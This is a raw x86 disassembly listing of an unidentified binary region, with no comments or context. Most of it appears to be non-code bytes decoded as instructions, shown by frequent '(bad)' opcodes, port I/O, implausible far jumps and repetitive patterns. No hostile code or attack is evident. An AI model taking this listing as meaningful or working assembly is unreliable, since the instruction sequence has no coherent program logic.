  41b48d:	scas   eax,DWORD PTR es:[edi]
  41b48e:	bound  ebp,QWORD PTR [edx+0x20]
  41b491:	mov    ebx,0xb5766f6a
  41b496:	cmp    al,0x1d
  41b498:	jo     0x41b513
  41b49a:	cmp    al,0x70
  41b49c:	ja     0x41b50d
  41b49e:	cmp    esp,DWORD PTR [ecx+0x73]
  41b4a1:	or     BYTE PTR [edx+0x72],bl
  41b4a4:	je     0x41b4f2
  41b4a6:	pop    eax
  41b4a7:	ins    BYTE PTR es:[edi],dx
  41b4a8:	imul   eax,DWORD PTR [eax],0x38
  41b4ab:	pushaw 
  41b4ad:	arpl   WORD PTR [edi+0x3a],bp
  41b4b0:	imul   esi,DWORD PTR [eax+ebp*1+0x62],0x5e
  41b4b5:	outs   dx,BYTE PTR ds:[esi]
  41b4b6:	jns    0x41b518
  41b4b8:	bound  esi,QWORD PTR [edx-0x8]
  41b4bb:	ss pop esi
  41b4bd:	jae    0x41b4fa
  41b4bf:	xor    BYTE PTR [edx+esi*2+0x31],ch
  41b4c3:	add    al,0xd3
  41b4c5:	call   FWORD PTR [ecx+0xc]
  41b4c8:	in     eax,0x6d
  41b4ca:	cmp    eax,0x5466d7f9
  41b4cf:	dec    edi
  41b4d0:	add    DWORD PTR [ecx+0xc],edi
  41b4d3:	nop
  41b4d4:	sbb    DWORD PTR [eax+0x5c],ebx
  41b4d7:	dec    ebp
  41b4d8:	adc    DWORD PTR [ecx+ecx*1],esi
  41b4db:	std    
  41b4dc:	and    al,0x30
  41b4de:	gs dec eax
  41b4e0:	and    esp,DWORD PTR cs:[ecx-0x12]
  41b4e4:	mov    ebx,0xbbee4122
  41b4e9:	sub    cl,BYTE PTR [eax+edx*2+0x13]
  41b4ed:	pop    eax
  41b4ee:	push   esp
  41b4ef:	push   eax
  41b4f0:	adc    ebx,DWORD PTR [eax+0x4c]
  41b4f3:	push   eax
  41b4f4:	adc    ebx,DWORD PTR [eax+0x14]
  41b4f7:	push   eax
  41b4f8:	adc    ebx,DWORD PTR [eax+0xc]
  41b4fb:	xor    BYTE PTR [ebx],dl
  41b4fd:	pop    eax
  41b4fe:	adc    al,0x30
  41b500:	adc    ebx,DWORD PTR [eax-0x2c]
  41b503:	pop    edi
  41b504:	mov    ch,0x67
  41b506:	(bad)  
  41b507:	shl    esp,1
  41b509:	(bad)  {k2}{z}
  41b50e:	add    ch,dl
  41b510:	pop    edi
  41b511:	mov    ebp,0xeed4c953
  41b516:	arpl   WORD PTR [esi+ecx*8-0x3b5c991e],dx
  41b51d:	add    edi,DWORD PTR [esi]
  41b51f:	jne    0x41b541
  41b521:	add    al,0xd6
  41b523:	imul   esp,DWORD PTR [eax],0x207b9204
  41b529:	add    al,0x8c
  41b52b:	ja     0x41b54d
  41b52d:	add    al,0x4
  41b52f:	arpl   WORD PTR [eax],sp
  41b531:	add    al,0x2e
  41b533:	pop    ebp
  41b534:	and    BYTE PTR [esp+ecx*1],al
  41b537:	mov    BYTE PTR [eax],ah
  41b539:	add    al,0xff
  41b53b:	mov    BYTE PTR [ecx],cl
  41b53d:	daa    
  41b53e:	add    al,0x28
  41b540:	scas   al,BYTE PTR es:[edi]
  41b541:	es add al,0xab
  41b544:	mov    ah,0x26
  41b546:	add    al,0x72
  41b548:	mov    ah,0x26
  41b54a:	add    al,0xb5
  41b54c:	mov    cl,0x26
  41b54e:	add    al,0x2a
  41b550:	out    0x26,eax
  41b552:	add    al,0x94
  41b554:	in     al,dx
  41b555:	es add al,0x7
  41b558:	jmp    0x3a6:0xe9860426
  41b55f:	cmp    eax,0xbf03a6e1
  41b564:	loopne 0x41b50c
  41b566:	add    ebp,DWORD PTR [ebx]
  41b568:	loopne 0x41b510
  41b56a:	add    ebp,DWORD PTR [edx]
  41b56c:	fisub  WORD PTR [esi-0x592210fd]
  41b572:	add    eax,DWORD PTR [eax]
  41b574:	jno    0x41b558
  41b576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b577:	add    ecx,ecx
  41b579:	xlat   BYTE PTR ds:[ebx]
  41b57a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b57b:	add    esi,DWORD PTR [eax-0x2b]
  41b57e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b57f:	add    ebx,DWORD PTR [esp+ebx*8-0x2458fc5a]
  41b586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b587:	add    edi,DWORD PTR [edx+0x7e03a6da]
  41b58d:	shl    BYTE PTR [esi-0x592b24fd],1
  41b593:	add    edx,DWORD PTR [eax+0x3803a6d4]
  41b599:	into   
  41b59a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b59b:	add    eax,DWORD PTR [edi-0x2bfbd930]
  41b5a1:	shl    BYTE PTR [esi],1
  41b5a3:	add    al,0x9a
  41b5a5:	and    DWORD PTR [edi],0x4
  41b5a8:	mov    dh,0x7e
  41b5aa:	daa    
  41b5ab:	add    al,0x5e
  41b5ad:	jg     0x41b5d6
  41b5af:	add    al,0x7f
  41b5b1:	je     0x41b5da
  41b5b3:	add    al,0x32
  41b5b5:	ins    DWORD PTR es:[edi],dx
  41b5b6:	add    BYTE PTR [ecx],ch
  41b5b8:	xor    eax,0x2d299c92
  41b5bd:	retf   
  41b5be:	call   0x2d29:0x9b483529
  41b5c5:	mov    ecx,0x2d35299d
  41b5ca:	sahf   
  41b5cb:	sub    DWORD PTR ds:0x35299ccf,ebp
  41b5d1:	dec    ebp
  41b5d2:	popf   
  41b5d3:	sub    DWORD PTR ds:0x299fb7,ebp
  41b5d9:	xor    eax,0x2d29a080
  41b5de:	cmp    ch,BYTE PTR [eax-0x51ebcd57]
  41b5e4:	test   eax,0xa9addf32
  41b5e9:	xor    bl,BYTE PTR [eax-0x43]
  41b5ec:	test   eax,0xa9c02332
  41b5f1:	xor    dh,BYTE PTR [edx+0x6732a9bf]
  41b5f7:	shr    BYTE PTR [ecx-0x564109ce],0x32
  41b5fe:	sar    DWORD PTR [esi-0x4127cd57],0xa9
  41b605:	xor    dh,BYTE PTR [ebx]
  41b607:	mov    edi,0xc29632a9
  41b60c:	test   eax,0xa9c11032
  41b611:	xor    dh,dl
  41b613:	ret    0x32a9
  41b616:	jne    0x41b5db
  41b618:	test   eax,0xa9c33732
  41b61d:	xor    bh,BYTE PTR [edi-0x63cad63b]
  41b623:	lds    ebp,FWORD PTR [ecx]
  41b625:	sub    eax,0x3529c7fa
  41b62a:	test   eax,ecx
  41b62c:	sub    DWORD PTR ds:0x4800c76e,ebp
  41b632:	add    eax,0x548ca15
  41b637:	(bad)  
  41b638:	int    0x18
  41b63a:	add    eax,0x1800ce17
  41b63f:	add    eax,0x508d181
  41b644:	in     eax,0xd1
  41b646:	or     BYTE PTR ds:0x518d5bd,al
  41b64c:	int3   
  41b64d:	xlat   BYTE PTR ds:[ebx]
  41b64e:	sbb    BYTE PTR ds:0x508da05,al
  41b654:	push   edx
  41b655:	fimul  DWORD PTR [eax]
  41b657:	add    eax,0x558dcc6
  41b65c:	or     ebx,ebp
  41b65e:	pop    eax
  41b65f:	add    eax,0xbc8dd89
  41b664:	cld    
  41b665:	(bad)  
  41b667:	or     edi,DWORD PTR [edx-0x22]
  41b66a:	fmul   DWORD PTR [ebx]
  41b66c:	clc    
  41b66d:	(bad)  
  41b66f:	or     esi,DWORD PTR [edx+eiz*8-0x38]
  41b673:	or     esp,edx
  41b675:	loop   0x41b63f
  41b677:	or     ecx,DWORD PTR [edi]
  41b679:	jecxz  0x41b613
  41b67b:	or     esi,ebp
  41b67d:	jecxz  0x41b617
  41b67f:	or     ebp,DWORD PTR [edx]
  41b681:	in     al,0x88
  41b683:	or     eax,esi
  41b685:	out    0x88,al
  41b687:	or     edi,esp
  41b689:	out    0x98,al
  41b68b:	or     esi,DWORD PTR [edx]
  41b68d:	out    0x98,eax
  41b68f:	or     ebp,DWORD PTR [esi-0x17]
  41b692:	mov    BYTE PTR [ebx],cl
  41b694:	aad    0xec
  41b696:	mov    BYTE PTR [ebx],cl
  41b698:	mov    esi,0x670ad8ee
  41b69d:	cmc    
  41b69e:	fmul   DWORD PTR [edx]
  41b6a0:	dec    edx
  41b6a1:	test   BYTE PTR [eax],0x48
  41b6a4:	add    eax,0xb080000
  41b6a9:	add    BYTE PTR [eax],al
  41b6ab:	xor    DWORD PTR [eax+0x1],esp
  41b6ae:	add    BYTE PTR [ecx],dh
  41b6b0:	pusha  
  41b6b1:	add    DWORD PTR [eax],eax
  41b6b3:	xor    DWORD PTR [eax+0x1],esp
  41b6b6:	add    BYTE PTR [ecx],dh
  41b6b8:	pusha  
  41b6b9:	add    DWORD PTR [ecx+0x5d],eax
  41b6bc:	leave  
  41b6bd:	in     al,0x6d
  41b6bf:	pop    ebp
  41b6c0:	add    ah,cl
  41b6c2:	pop    esi
  41b6c3:	(bad)  
  41b6c4:	clc    
  41b6c5:	add    edx,DWORD PTR [ecx+0x7d]
  41b6c8:	and    DWORD PTR [eax-0x35ba9dae],edi
  41b6ce:	dec    edx
  41b6cf:	popa   
  41b6d0:	out    dx,eax
  41b6d1:	mov    cl,0x53
  41b6d3:	or     al,0x17
  41b6d5:	(bad)  
  41b6d6:	dec    DWORD PTR ds:0x29632e04
  41b6dc:	std    
  41b6dd:	add    esp,DWORD PTR [ebx]
  41b6df:	popa   
  41b6e0:	xchg   edx,eax
  41b6e1:	mov    ecx,0xd63222ff
  41b6e6:	bound  esi,QWORD PTR [ecx]
  41b6e8:	xchg   ebx,eax
  41b6e9:	jmp    0xc685d450
  41b6ee:	ja     0x41b6fc
  41b6f0:	inc    ebx
  41b6f1:	(bad)  
  41b6f2:	jae    0x41b708
  41b6f4:	mov    eax,ds:0x43135f01
  41b6f9:	in     eax,0x2d
  41b6fb:	rol    DWORD PTR [eax-0x2b],cl
  41b6fe:	(bad)  
  41b6ff:	cmp    DWORD PTR [ecx+0xe],ebp
  41b702:	or     ch,BYTE PTR [edx+ebx*2]
  41b705:	or     ah,BYTE PTR [eax]
  41b707:	add    BYTE PTR [ebx],bl
  41b709:	jns    0x41b6f2
  41b70b:	push   0x20076511
  41b710:	int    0x84
  41b712:	in     eax,dx
  41b713:	pop    ds
  41b714:	sub    BYTE PTR ds:0x5d112012,bh
  41b71a:	pop    es
  41b71b:	pop    es
  41b71c:	cwde   
  41b71d:	jle    0x41b740
  41b71f:	pop    es
  41b720:	cmp    BYTE PTR [eax-0x1a],al
  41b723:	ja     0x41b6ad
  41b725:	or     DWORD PTR [edx-0x30],ebx
  41b728:	add    BYTE PTR ss:[edi],al
  41b72b:	and    al,0x51
  41b72d:	and    al,0x18
  41b72f:	and    al,0x51
  41b731:	add    BYTE PTR [edi],al
  41b733:	and    al,0x94
  41b735:	fidivr WORD PTR [edx]
  41b737:	jmp    0x41b74f
  41b739:	add    ah,ch
  41b73b:	and    edx,DWORD PTR [esi-0x1d]
  41b73e:	inc    ecx
  41b73f:	or     DWORD PTR [ebx],edi
  41b741:	sub    DWORD PTR [ebx-0x1f],eax
  41b744:	dec    edx
  41b745:	sub    eax,esi
  41b747:	and    edx,DWORD PTR [ecx]
  41b749:	and    al,0xd7
  41b74b:	and    esi,DWORD PTR [ecx]
  41b74d:	sub    edi,eax
  41b74f:	and    edx,DWORD PTR [ecx]
  41b751:	sub    eax,esp
  41b753:	(bad)  
  41b754:	adc    BYTE PTR [ecx],ch
  41b756:	(bad)  
  41b757:	and    esi,DWORD PTR [ecx]
  41b759:	fimul  DWORD PTR [esi]
  41b75b:	loope  0x41b777
  41b75d:	fnstsw WORD PTR [ecx-0x51aa8eb]
  41b763:	out    0x9e,eax
  41b765:	dec    ebp
  41b766:	out    0x3,eax
  41b768:	xor    DWORD PTR [ecx],ecx
  41b76a:	out    0x3,eax
  41b76c:	add    BYTE PTR [ecx],dh
  41b76e:	or     edi,esp
  41b770:	add    esi,DWORD PTR [ecx]
  41b772:	or     edi,esp
  41b774:	add    esi,DWORD PTR [ecx]
  41b776:	or     edi,esp
  41b778:	add    esi,DWORD PTR [ecx]
  41b77a:	or     edi,esp
  41b77c:	add    esi,DWORD PTR [ecx]
  41b77e:	or     edi,esp
  41b780:	add    esi,DWORD PTR [ecx]
  41b782:	or     edi,esp
  41b784:	add    esi,DWORD PTR [ecx]
  41b786:	or     edi,esp
  41b788:	add    esi,DWORD PTR [ecx]
  41b78a:	or     edi,esp
  41b78c:	add    esi,DWORD PTR [ecx]
  41b78e:	or     edi,esp
  41b790:	add    esi,DWORD PTR [ecx]
  41b792:	or     edi,esp
  41b794:	add    esi,DWORD PTR [ecx]
  41b796:	or     edi,esp
  41b798:	add    esi,DWORD PTR [ecx]
  41b79a:	or     edi,esp
  41b79c:	add    esi,DWORD PTR [ecx]
  41b79e:	or     DWORD PTR [eax],eax
  41b7a0:	jmp    0xe941c0d7
  41b7a5:	xor    cl,BYTE PTR [ecx]
  41b7a7:	add    cl,ch
  41b7a9:	xor    cl,BYTE PTR [ecx]
  41b7ab:	add    cl,ch
  41b7ad:	xor    cl,BYTE PTR [ecx]
  41b7af:	add    cl,ch
  41b7b1:	xor    cl,BYTE PTR [ecx]
  41b7b3:	add    cl,ch
  41b7b5:	xor    cl,BYTE PTR [ecx]
  41b7b7:	add    cl,ch
  41b7b9:	xor    cl,BYTE PTR [ecx]
  41b7bb:	add    cl,ch
  41b7bd:	xor    cl,BYTE PTR [ecx]
  41b7bf:	add    cl,ch
  41b7c1:	xor    cl,BYTE PTR [ecx]
  41b7c3:	add    cl,ch
  41b7c5:	xor    cl,BYTE PTR [ecx]
  41b7c7:	add    cl,ch
  41b7c9:	xor    cl,BYTE PTR [ecx]
  41b7cb:	add    cl,ch
  41b7cd:	xor    cl,BYTE PTR [ecx]
  41b7cf:	add    cl,ch
  41b7d1:	add    BYTE PTR [edx],dh
  41b7d3:	or     DWORD PTR [eax],eax
  41b7d5:	jmp    0xe941c10c
  41b7da:	xor    cl,BYTE PTR [ecx]
  41b7dc:	add    cl,ch
  41b7de:	xor    cl,BYTE PTR [ecx]
  41b7e0:	add    cl,ch
  41b7e2:	xor    cl,BYTE PTR [ecx]
  41b7e4:	add    cl,ch
  41b7e6:	xor    cl,BYTE PTR [ecx]
  41b7e8:	add    cl,ch
  41b7ea:	xor    cl,BYTE PTR [ecx]
  41b7ec:	add    cl,ch
  41b7ee:	xor    cl,BYTE PTR [ecx]
  41b7f0:	add    cl,ch
  41b7f2:	xor    cl,BYTE PTR [ecx]
  41b7f4:	add    cl,ch
  41b7f6:	xor    cl,BYTE PTR [ecx]
  41b7f8:	add    cl,ch
  41b7fa:	xor    cl,BYTE PTR [ecx]
  41b7fc:	add    cl,ch
  41b7fe:	xor    cl,BYTE PTR [ecx]
  41b800:	add    cl,ch
  41b802:	xor    cl,BYTE PTR [ecx]
  41b804:	add    cl,ch
  41b806:	xor    cl,BYTE PTR [ecx]
  41b808:	add    cl,ch
  41b80a:	xor    cl,BYTE PTR [ecx]
  41b80c:	add    cl,ch
  41b80e:	xor    cl,BYTE PTR [ecx]
  41b810:	add    cl,ch
  41b812:	xor    cl,BYTE PTR [ecx]
  41b814:	add    cl,ch
  41b816:	xor    cl,BYTE PTR [ecx]
  41b818:	add    BYTE PTR [eax],al
  41b81a:	dec    eax
  41b81b:	or     BYTE PTR [eax],al
  41b81d:	add    BYTE PTR [eax],bl
  41b81f:	or     BYTE PTR [eax],al
  41b821:	add    BYTE PTR [eax],bl
  41b823:	or     BYTE PTR [eax],al
  41b825:	add    BYTE PTR [eax],cl
  41b827:	or     BYTE PTR [eax],al
  41b829:	add    BYTE PTR [eax],cl
  41b82b:	or     BYTE PTR [eax],al
  41b82d:	add    BYTE PTR [eax],bl
  41b82f:	or     BYTE PTR [eax],al
  41b831:	add    BYTE PTR [eax],bl
  41b833:	or     BYTE PTR [eax],al
  41b835:	add    BYTE PTR [eax],al
  41b837:	or     BYTE PTR [eax],cl
  41b839:	add    BYTE PTR [eax],al
  41b83b:	or     BYTE PTR [eax],cl
  41b83d:	add    BYTE PTR [eax],al
  41b83f:	fadd   DWORD PTR [edi]
  41b841:	add    BYTE PTR [eax],al
  41b843:	fadd   DWORD PTR [edi]
  41b845:	add    BYTE PTR [eax],al
  41b847:	enter  0x7,0x0
  41b84b:	enter  0x7,0x0
  41b84f:	fadd   DWORD PTR [edi]
  41b851:	add    BYTE PTR [eax],al
  41b853:	fadd   DWORD PTR [edi]
  41b855:	add    BYTE PTR [eax],al
  41b857:	enter  0x7,0x0
  41b85b:	enter  0x7,0x0
  41b85f:	cwde   
  41b860:	pop    es
  41b861:	add    BYTE PTR [eax],al
  41b863:	cwde   
  41b864:	pop    es
  41b865:	add    BYTE PTR [eax],al
  41b867:	mov    BYTE PTR [edi],al
  41b869:	add    BYTE PTR [eax],al
  41b86b:	mov    BYTE PTR [edi],al
  41b86d:	add    BYTE PTR [eax],al
  41b86f:	cwde   
  41b870:	pop    es
  41b871:	add    BYTE PTR [eax],al
  41b873:	cwde   
  41b874:	pop    es
  41b875:	add    BYTE PTR [eax],al
  41b877:	mov    BYTE PTR [edi],al
  41b879:	add    BYTE PTR [eax],al
  41b87b:	mov    BYTE PTR [edi],al
  41b87d:	add    BYTE PTR [eax],al
  41b87f:	pop    eax
  41b880:	pop    es
  41b881:	add    BYTE PTR [eax],al
  41b883:	pop    eax
  41b884:	pop    es
  41b885:	add    BYTE PTR [eax],al
  41b887:	dec    eax
  41b888:	pop    es
  41b889:	add    BYTE PTR [eax],al
  41b88b:	dec    eax
  41b88c:	pop    es
  41b88d:	add    BYTE PTR [eax],al
  41b88f:	pop    eax
  41b890:	pop    es
  41b891:	add    BYTE PTR [eax],al
  41b893:	xor    DWORD PTR [edx+0x1],esp
  41b896:	add    BYTE PTR [ecx],dh
  41b898:	bound  eax,QWORD PTR [ecx]
  41b89a:	add    BYTE PTR [eax],al
  41b89c:	xor    DWORD PTR [edx+0x1],esp
  41b89f:	add    BYTE PTR [ecx],dh
  41b8a1:	pusha  
  41b8a2:	add    DWORD PTR [eax],eax
  41b8a4:	xor    DWORD PTR [eax+0x1],esp
  41b8a7:	add    BYTE PTR [ecx],dh
  41b8a9:	pusha  
  41b8aa:	add    DWORD PTR [eax],eax
  41b8ac:	xor    DWORD PTR [eax+0x1],esp
  41b8af:	add    BYTE PTR [ecx],dh
  41b8b1:	pusha  
  41b8b2:	add    DWORD PTR [eax],eax
  41b8b4:	xor    DWORD PTR [eax+0x1],esp
  41b8b7:	add    BYTE PTR [ecx],dh
  41b8b9:	pusha  
  41b8ba:	add    DWORD PTR [eax],eax
  41b8bc:	xor    DWORD PTR [eax+0x1],esp
  41b8bf:	add    BYTE PTR [ecx],dh
  41b8c1:	pusha  
  41b8c2:	add    DWORD PTR [eax],eax
  41b8c4:	xor    DWORD PTR [eax+0x1],esp
  41b8c7:	add    BYTE PTR [ecx],dh
  41b8c9:	pusha  
  41b8ca:	add    DWORD PTR [eax],eax
  41b8cc:	xor    DWORD PTR [eax+0x1],esp
  41b8cf:	add    BYTE PTR [ecx],dh
  41b8d1:	pusha  
  41b8d2:	add    DWORD PTR [eax],eax
  41b8d4:	xor    DWORD PTR [eax+0x1],esp
  41b8d7:	add    BYTE PTR [ecx],dh
  41b8d9:	pusha  
  41b8da:	add    DWORD PTR [eax],eax
  41b8dc:	xor    DWORD PTR [eax+0x1],esp
  41b8df:	add    BYTE PTR [ecx],dh
  41b8e1:	pusha  
  41b8e2:	add    DWORD PTR [eax],eax
  41b8e4:	xor    DWORD PTR [eax+0x1],esp
  41b8e7:	add    BYTE PTR [ecx],dh
  41b8e9:	pusha  
  41b8ea:	add    DWORD PTR [eax],eax
  41b8ec:	xor    DWORD PTR [ecx+0x24],esp
  41b8ef:	inc    ebx
  41b8f0:	push   ss
  41b8f1:	fldcw  WORD PTR [ebx+0x34b296cb]
  41b8f7:	mov    edx,0x31ad3299
  41b8fc:	and    ecx,ebx
  41b8fe:	stos   DWORD PTR es:[edi],eax
  41b8ff:	retf   
  41b900:	add    BYTE PTR [esi+0x61],bl
  41b903:	and    al,0x43
  41b905:	into   
  41b906:	fild   WORD PTR [eax]
  41b908:	inc    eax
  41b909:	xor    DWORD PTR [eax],eax
  41b90b:	add    al,0x10
  41b90d:	xor    DWORD PTR [ecx],ecx
  41b90f:	out    dx,eax
  41b910:	add    esi,DWORD PTR ds:0x4603e909
  41b916:	dec    edx
  41b917:	out    0x3,eax
  41b919:	mov    cl,0x9
  41b91b:	out    0x3,eax
  41b91d:	icebp  
  41b91e:	or     bh,ah
  41b920:	add    edx,DWORD PTR [ecx+0x9]
  41b923:	out    0x3,eax
  41b925:	inc    ecx
  41b926:	or     edi,esp
  41b928:	add    ebp,DWORD PTR [ecx]
  41b92a:	or     edi,esp
  41b92c:	add    ebp,DWORD PTR ds:0x3303e709
  41b932:	or     edi,esp
  41b934:	add    eax,DWORD PTR [esi]
  41b936:	dec    edx
  41b937:	out    0x83,eax
  41b939:	xor    DWORD PTR [ecx],ecx
  41b93b:	out    0xc3,eax
  41b93d:	test   BYTE PTR [ecx-0x19],0x23
  41b941:	xor    DWORD PTR [ecx],ecx
  41b943:	out    0xf3,eax
  41b945:	out    0x49,al
  41b947:	out    0xb,eax
  41b949:	xor    DWORD PTR [ecx],ecx
  41b94b:	out    0xff,eax
  41b94d:	(bad)  
  41b94e:	dec    ecx
  41b94f:	out    0x1,eax
  41b951:	xor    DWORD PTR [ecx],ecx
  41b953:	out    0x4,eax
  41b955:	xor    DWORD PTR [ecx],ecx
  41b957:	addr16 add al,0x31
  41b95a:	or     DWORD PTR [edi],esp
  41b95c:	add    al,0x31
  41b95e:	or     edi,eax
  41b960:	add    esi,DWORD PTR [ecx]
  41b962:	or     edi,edx
  41b964:	add    eax,DWORD PTR [eax]
  41b966:	xor    DWORD PTR [ecx],ecx
  41b968:	fild   WORD PTR [ebx]
  41b96a:	xor    DWORD PTR [ecx],ecx
  41b96c:	jecxz  0x41b971
  41b96e:	xor    DWORD PTR [ecx],ecx
  41b970:	jmp    0xe84aea78
  41b975:	add    esi,DWORD PTR [ecx]
  41b977:	or     DWORD PTR [edi],ecx
  41b979:	adc    al,0x49
  41b97b:	sub    edi,ebp
  41b97d:	repz or DWORD PTR cs:[eax],eax
  41b981:	adc    eax,0xf4e02816
  41b986:	das    
  41b987:	or     BYTE PTR [eax],al
  41b989:	repz inc eax
  41b98b:	pop    ds
  41b98c:	and    dl,bl
  41b98e:	pusha  
  41b98f:	inc    DWORD PTR [ecx]
  41b991:	loop   0x41b9b6
  41b993:	and    BYTE PTR [ecx],ah
  41b995:	fbstp  TBYTE PTR [ebx+ebx*1]
  41b998:	test   DWORD PTR es:[ebx+edi*8+0x5],0x231e21cc
  41b9a1:	in     al,0x21
  41b9a3:	adc    al,0x3
  41b9a5:	mov    ebp,0xd523f536
  41b9aa:	push   cs
  41b9ab:	adc    eax,0x1223d204
  41b9b0:	add    eax,ebp
  41b9b2:	xor    BYTE PTR ds:0x1538f106,cl
  41b9b8:	push   cs
  41b9b9:	out    0x5,al
  41b9bb:	sbb    dl,BYTE PTR [ebx]
  41b9bd:	div    ch
  41b9bf:	and    DWORD PTR [esp+esi*8],ebx
  41b9c2:	loop   0x41b9d6
  41b9c4:	adc    eax,0x190ae6e9
  41b9c9:	out    0x0,eax
  41b9cb:	xor    DWORD PTR ds:0x11e0d707,ebx
  41b9d1:	add    DWORD PTR [eax],eax
  41b9d3:	into   
  41b9d4:	adc    eax,0x14c20306
  41b9d9:	inc    eax
  41b9db:	and    esp,DWORD PTR [edi]
  41b9dd:	and    al,0xbf
  41b9df:	and    al,0x24
  41b9e1:	and    eax,0x2ce956bb
  41b9e6:	rol    BYTE PTR [edx-0x11],cl
  41b9e9:	xor    al,0xc8
  41b9eb:	cs hlt 
  41b9ed:	es mov eax,0xe91d2553
  41b9f3:	mov    es,WORD PTR [edi+0x0]
  41b9f6:	jmp    0xe941c32d
  41b9fb:	xor    cl,BYTE PTR [eax-0x3]
  41b9fe:	in     eax,0x76
  41ba00:	inc    edi
  41ba01:	add    BYTE PTR [eax],al
  41ba03:	pop    esp
  41ba04:	or     al,0xfd
  41ba06:	add    BYTE PTR [eax+ecx*2-0x2],cl
  41ba0a:	dec    DWORD PTR [esp+ecx*1+0x0]
  41ba0e:	add    BYTE PTR [eax+0xc],cl
  41ba11:	std    
  41ba12:	call   FWORD PTR [eax+0x48]
  41ba15:	std    
  41ba16:	call   FWORD PTR [eax+0x48]
  41ba19:	inc    BYTE PTR [eax]
  41ba1b:	dec    esp
  41ba1c:	dec    eax
  41ba1d:	inc    BYTE PTR [eax]
  41ba1f:	dec    eax
  41ba20:	dec    eax
  41ba21:	std    
  41ba22:	call   FWORD PTR [eax+ecx*2]
  41ba25:	std    
  41ba26:	add    BYTE PTR [esp+ecx*1],cl
  41ba29:	std    
  41ba2a:	add    BYTE PTR [eax],cl
  41ba2c:	or     al,0x0
  41ba2e:	add    DWORD PTR [eax],eax
  41ba30:	or     al,0xc
  41ba32:	add    BYTE PTR [eax],al
  41ba34:	sbb    al,0x48
  41ba36:	std    
  41ba37:	call   FWORD PTR [eax]
  41ba39:	dec    eax
  41ba3a:	std    
  41ba3b:	add    BYTE PTR [eax],cl
  41ba3d:	dec    eax
  41ba3e:	std    
  41ba3f:	add    BYTE PTR [eax],cl
  41ba41:	dec    eax
  41ba42:	(bad)  
  41ba43:	(bad)  
  41ba44:	fadd   DWORD PTR [edi-0x2]
  41ba47:	(bad)  
  41ba48:	fmul   DWORD PTR [ebx]
  41ba4a:	std    
  41ba4b:	add    al,cl
  41ba4d:	or     edi,ebp
  41ba4f:	add    ah,cl
  41ba51:	inc    edi
  41ba52:	std    
  41ba53:	add    ah,bl
  41ba55:	or     edi,ebp
  41ba57:	dec    esp
  41ba59:	or     eax,DWORD PTR [eax]
  41ba5b:	add    esp,ecx
  41ba5d:	or     eax,DWORD PTR [eax]
  41ba5f:	add    esp,ecx
  41ba61:	or     edi,ebp
  41ba63:	call   FWORD PTR [eax-0x73fffff5]
  41ba69:	inc    edi
  41ba6a:	std    
  41ba6b:	dec    DWORD PTR [edi+eax*2+0xb88fffe]
  41ba72:	add    BYTE PTR [ecx],al
  41ba74:	cwde   
  41ba75:	or     edi,ebp
  41ba77:	dec    DWORD PTR [edi+eax*2+0x363100fe]
  41ba7e:	add    DWORD PTR [eax],eax
  41ba80:	xor    DWORD PTR [edx],esi
  41ba82:	add    edi,edi
  41ba84:	xor    DWORD PTR [edx],esi
  41ba86:	std    
  41ba87:	(bad)  
  41ba88:	xor    DWORD PTR [edx],esi
  41ba8a:	add    DWORD PTR [eax],eax
  41ba8c:	xor    BYTE PTR [edx],dh
  41ba8e:	add    DWORD PTR [eax],eax
  41ba90:	xor    BYTE PTR [edx],dh
  41ba92:	std    
  41ba93:	inc    DWORD PTR [eax]
  41ba95:	dec    esi
  41ba96:	xor    eax,0x3231ff01
  41ba9b:	add    edi,edi
  41ba9d:	ds xor ebp,edi
  41baa0:	(bad)  
  41baa1:	ss sub eax,0x30300001
  41baa7:	std    
  41baa8:	jmp    DWORD PTR [esi]
  41baaa:	sub    eax,0x34310001
  41baaf:	std    
  41bab0:	push   DWORD PTR [ecx]
  41bab2:	sub    al,0xfd
  41bab4:	dec    BYTE PTR [esi]
  41bab6:	xor    eax,0x2c31fefd
  41babb:	add    edi,edi
  41babd:	(bad)  
  41babe:	xor    BYTE PTR [ecx],al
  41bac0:	push   DWORD PTR [ecx]
  41bac2:	sub    al,0xfd
  41bac4:	push   DWORD PTR [ecx]
  41bac6:	xor    al,0x1
  41bac8:	add    BYTE PTR [eax],dh
  41baca:	sub    al,0xfd
  41bacc:	(bad)  
  41bacd:	fidiv  WORD PTR [edi*8-0x2cf2902]
  41bad4:	(bad)  
  41bad5:	xor    DWORD PTR [edi*8-0x2cf3901],esi
  41badc:	push   DWORD PTR [ecx]
  41bade:	xor    ch,bh
  41bae0:	push   DWORD PTR [ecx]
  41bae2:	xor    BYTE PTR [ecx],al
  41bae4:	add    BYTE PTR [ecx],dh
  41bae6:	xor    al,0x1
  41bae8:	jmp    DWORD PTR [esi-0x610102d0]
  41baee:	xor    BYTE PTR [ecx],al
  41baf0:	add    BYTE PTR [ecx],dh
  41baf2:	sub    al,0x1
  41baf4:	push   DWORD PTR [ecx]
  41baf6:	or     DWORD PTR [edi],eax
  41baf8:	test   BYTE PTR [eax],al
  41bafa:	and    DWORD PTR [ecx-0x76ce7c19],ecx
  41bb00:	out    0x83,eax
  41bb02:	xor    DWORD PTR [ecx],ecx
  41bb04:	pop    es
  41bb05:	test   BYTE PTR [ecx+0x9],al
  41bb08:	out    0x3,eax
  41bb0a:	inc    ecx
  41bb0b:	or     DWORD PTR [edi],eax
  41bb0d:	add    al,0x31
  41bb0f:	or     DWORD PTR [edi],eax
  41bb11:	add    al,0x41
  41bb13:	mov    DWORD PTR [edi],eax
  41bb15:	test   BYTE PTR [ecx],dh
  41bb17:	mov    edi,eax
  41bb19:	add    esi,DWORD PTR [ecx]
  41bb1b:	mov    edi,eax
  41bb1d:	and    DWORD PTR [ecx],0xffffff89
  41bb20:	out    0x83,eax
  41bb22:	and    DWORD PTR [ecx-0x76cefc19],ecx
  41bb28:	out    0x83,eax
  41bb2a:	xor    DWORD PTR [ecx+0x94103e7],ecx
  41bb30:	mov    DWORD PTR [ebx],0x3c70931
  41bb36:	and    DWORD PTR [ecx+0x92183e7],ecx
  41bb3c:	pop    es
  41bb3d:	add    al,0x21
  41bb3f:	or     DWORD PTR [edi],eax
  41bb41:	test   BYTE PTR [ecx],dh
  41bb43:	mov    edi,esp
  41bb45:	add    esi,DWORD PTR [ecx]
  41bb47:	or     edi,esp
